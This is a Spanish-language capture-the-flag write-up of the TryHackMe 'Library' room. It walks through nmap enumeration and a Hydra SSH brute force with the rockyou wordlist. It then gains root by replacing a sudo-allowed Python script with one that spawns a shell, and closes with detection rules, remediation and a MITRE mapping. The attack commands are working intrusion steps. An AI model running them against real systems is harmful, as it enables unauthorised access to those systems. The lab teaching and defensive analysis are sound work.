# Library — TryHackMe (Writeup)

> **Plataforma:** TryHackMe · **Dificultad:** Easy · **SO:** Linux (Ubuntu 16.04.6 LTS)
> **Objetivo:** conseguir `user.txt` y `root.txt` (boot2root)
> **Vectores:** enumeración web → fuerza bruta SSH → escalada por `sudo` sobre script en directorio escribible por el usuario
>
> _Nota: las flags se omiten a propósito (buenas prácticas y términos de uso de la plataforma). El valor de este writeup está en la metodología y en el análisis defensivo, no en el hash._

---

## 1. Reconocimiento

Escaneo de puertos completo y, después, detección de versiones solo sobre lo que aparece abierto:

```bash
sudo nmap -p- -sS <IP>            # descubrir todos los puertos (TCP SYN scan)
sudo nmap -sV -p 22,80 <IP>       # versión de servicio en los puertos abiertos
```

Resultado:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Solo dos servicios. Como SSH exige credenciales para hablar, el punto de partida lógico es el **80/HTTP**: es superficie que se puede recorrer entera sin autenticarse, y muchas veces es ahí donde aparece la llave que abre el SSH.

> Distinción que conviene tener clara (protocolo vs puerto vs versión): en `22/tcp open ssh OpenSSH 7.2p2`, el **puerto** es `22`, el **servicio** es `ssh`, y la **versión** del software que lo sirve es `OpenSSH 7.2p2`. La columna de versión la aporta `-sV`, no el `-sS`.

---

## 2. Enumeración web (puerto 80)

Dos vistazos gratuitos que hago siempre en cualquier web antes de nada: **código fuente** (`view-source`) y **`robots.txt`**.

El `robots.txt` devuelve algo anómalo:

```
User-agent: rockyou
Disallow: /
```

`rockyou` no es ningún crawler (Googlebot, Bingbot…). Es la wordlist de contraseñas más conocida del mundo, colocada donde iría el nombre de un robot: una **pista plantada** por el creador de la room que apunta a un ataque de diccionario.

Pero un diccionario de contraseñas es solo **media credencial**. Falta el **usuario**. Recorriendo el blog del puerto 80, el autor de la entrada aparece a la vista:

```
Posted on June 20th 2020 by meliodas
```

Usuario candidato: **`meliodas`**.

`gobuster` en paralelo no aportó nada explotable (solo `403` en `.hta*`/`server-status`, un `301` a `/images` y ficheros ya conocidos) — la pista estaba a plena vista, no en una ruta oculta:

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt
```

---

## 3. Acceso inicial — fuerza bruta SSH

Con las dos mitades (`meliodas` + `rockyou`), ataque de diccionario contra el SSH:

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt <IP> ssh
```

> Regla mnemotécnica de Hydra: **minúscula = valor único** (`-l` usuario), **mayúscula = fichero/lista** (`-P` wordlist). IP y servicio van separados al final, no en formato `servicio@ip`.

Hydra encuentra credenciales válidas para `meliodas`. Esto además **confirma la hipótesis** del usuario: no lo sabíamos con certeza, era el mejor candidato, y el propio resultado del ataque lo valida.

```bash
ssh meliodas@<IP>
```

Ya dentro, primera verificación (no fiarse: comprobar) y primera flag:

```bash
whoami          # meliodas
cat user.txt    # -> user.txt
```

---

## 4. Escalada de privilegios

`ls -l` en el home revela un fichero que **no pertenece al usuario**:

```
-rw-r--r-- 1 root     root     353 ... bak.py
-rw-rw-r-- 1 meliodas meliodas  33 ... user.txt
```

`bak.py` es de **root** pero vive en `/home/meliodas/`. Su contenido (legible por cualquiera) es un simple backup del sitio web:

```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

El comando que revela el camino es `sudo -l`:

```bash
sudo -l
```

```
User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

Lo importante de esa línea:

- `(ALL)` → se puede ejecutar **como cualquier usuario, incluido root**.
- `NOPASSWD` → sin pedir contraseña.
- El script objetivo está en **`/home/meliodas/`**, un directorio del que **`meliodas` es propietario**.

Aquí está la palanca: no puedo *editar* el contenido de `bak.py` (es de root), pero como controlo la **carpeta** donde vive, sí puedo **borrarlo y poner otro `bak.py` mío** en su lugar. Y `sudo` ejecutará ese fichero **como root**.

```bash
rm /home/meliodas/bak.py
nano /home/meliodas/bak.py
```

Contenido del nuevo `bak.py` (se aprovecha que `import os` ya estaba en el original; corre como root, así que la shell que lance hereda root):

```python
import os
os.system("/bin/sh")
```

Disparo final, con el comando exacto que autorizaba el sudoers:

```bash
sudo /usr/bin/python /home/meliodas/bak.py
```

Verificación y segunda flag:

```bash
whoami          # root
cat /root/root.txt
```

---

## 5. Causa raíz

La escalada no depende de un único fallo, sino de **dos condiciones que por separado no bastan**:

1. **Configuración de `sudo` excesiva:** se concede ejecutar un script como root (`(ALL) NOPASSWD`) — de por sí, peligroso.
2. **El script vive en un directorio escribible por el usuario:** al estar `bak.py` dentro de `/home/meliodas/`, el usuario puede sustituir el fichero por uno propio.

Si el script hubiera estado en una ruta controlada solo por root (p. ej. `/opt`, `/usr/local/bin`), la condición 1 por sí sola no habría sido explotable. La raíz real es **la combinación**: sudo como root sobre un artefacto que el atacante controla.

---

## 6. Perspectiva defensiva (SOC)

La parte que más importa desde un rol Blue Team: cómo se **detecta** y cómo se **remedia**.

### Detección

- **Fuente de log:** los intentos de autenticación SSH quedan en **`/var/log/auth.log`** (en RHEL/CentOS sería `/var/log/secure`). Se ven líneas `Failed password for meliodas from <IP>` y, si cuela, `Accepted password for ...`.
- **Regla de correlación (SIEM):** un ataque de fuerza bruta se define por **umbral + ventana + mismo origen**, con números concretos. Ejemplo:
  - **≥ 30 `Failed password` desde la misma IP de origen en < 60 s** → alerta de *brute force* (T1110).
  - **Un `Accepted password` de esa misma IP justo después de la ráfaga** → escalar como **compromiso confirmado**, no como simple intento. Esta correlación es la alerta crítica: distingue "lo intentaron" de "entraron".
- **Post-explotación:** la ejecución vía `sudo` de un script modificado también deja rastro en los logs de sudo/auth; monitorizar invocaciones de `sudo` sobre binarios/scripts en rutas de usuario es una detección complementaria.

### Remediación

| Agujero | Arreglo |
|---|---|
| Entrada por SSH (contraseña débil forzable con rockyou) | Deshabilitar autenticación por contraseña y usar **solo clave pública/privada** (`PasswordAuthentication no` en `/etc/ssh/sshd_config`). Complementar con **fail2ban** para banear IPs tras N fallos. |
| Escalada por `sudo`/`bak.py` | **Retirar la entrada del sudoers** que da a `meliodas` ejecutar el script como root; si el script debe ejecutarse con privilegios, **moverlo a una ruta propiedad de root y no escribible por el usuario** (`/opt`, `/usr/local/bin`). Aplicar **mínimo privilegio**. |

---

## 7. Mapeo MITRE ATT&CK (orientativo)

| Fase | Técnica |
|---|---|
| Acceso inicial / credenciales | **T1110.001** — Brute Force: Password Guessing |
| Acceso | **T1078** — Valid Accounts |
| Escalada de privilegios | **T1548.003** — Abuse Elevation Control Mechanism: Sudo and Sudo Caching |

---

## Resumen de la cadena

`nmap` (22 + 80) → `robots.txt` revela la pista `rockyou` → usuario `meliodas` en el blog → **Hydra** contra SSH → credenciales → `user.txt` → `sudo -l` muestra `NOPASSWD` sobre un script en el home del usuario → sustituir el script por uno propio → ejecutarlo con `sudo` → **root** → `root.txt`.
